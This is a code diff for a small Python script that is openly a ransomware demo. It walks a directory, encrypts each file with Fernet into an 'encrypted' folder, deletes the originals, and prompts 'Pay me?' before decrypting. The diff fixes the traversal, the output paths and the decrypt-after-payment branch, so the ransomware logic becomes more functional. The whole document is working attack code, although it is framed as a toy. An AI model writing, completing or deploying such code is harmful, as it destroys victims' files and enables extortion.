@@ -6,15 +6,12 @@ from rich.console import Console
 
 console = Console()
 
-def traverse_dir(dir: Path) -> List[Path]:
+def traverse_dir(dir: Path, trav_index: int = 0) -> List[Path]:
     """Traverse given dir and return list of files"""
-    dir_list = []
     if dir.is_file():
-        dir_list.append(dir)
+        return [dir]
     elif dir.is_dir():
-        for file in dir.iterdir():
-            traverse_dir(file)
-    return dir_list
+        return [file for file in dir.iterdir()]
 
 
 def encrypt(key, file: Path):
@@ -23,7 +20,7 @@ def encrypt(key, file: Path):
     with open(file, "rb") as plain_file:
         data = plain_file.read()
         encrypted = fernet.encrypt(data)
-    with open(os.path.join(os.getcwd(), Path("encrypted" + file.name)), "wb") as encrypt_file:
+    with open(os.path.join(os.getcwd(), Path("encrypted//encrypted_" + file.name)), "wb") as encrypt_file:
         encrypt_file.write(encrypted)
     os.remove(file)
 
@@ -33,7 +30,7 @@ def decrypt(key, file: Path):
     with open(file, "rb") as cipher_file:
         data = cipher_file.read()
         decrypted = fernet.decrypt(data)
-    with open(os.path.join(os.getcwd(), Path("decrypted" + file.name)), "wb") as decrypt_file:
+    with open(os.path.join(os.getcwd(), Path("decrypted//decrypted_" + file.name)), "wb") as decrypt_file:
         decrypt_file.write(decrypted)
 
 
@@ -49,9 +46,11 @@ def main():
     reply = input("And here's where money gets requested. Pay me? Y/N ")
     if reply.startswith("Y") or reply.startswith("y"):
         console.print("Thank you! Decrypting now.")
-
+        en_file_list = traverse_dir(Path(os.path.join(os.getcwd(), Path("encrypted"))))
+        for en_file in en_file_list:
+            decrypt(key, en_file)
     else:
-        console.print("Files remain decrypted.")
+        console.print("Files remain encrypted.")
 
 
 main()
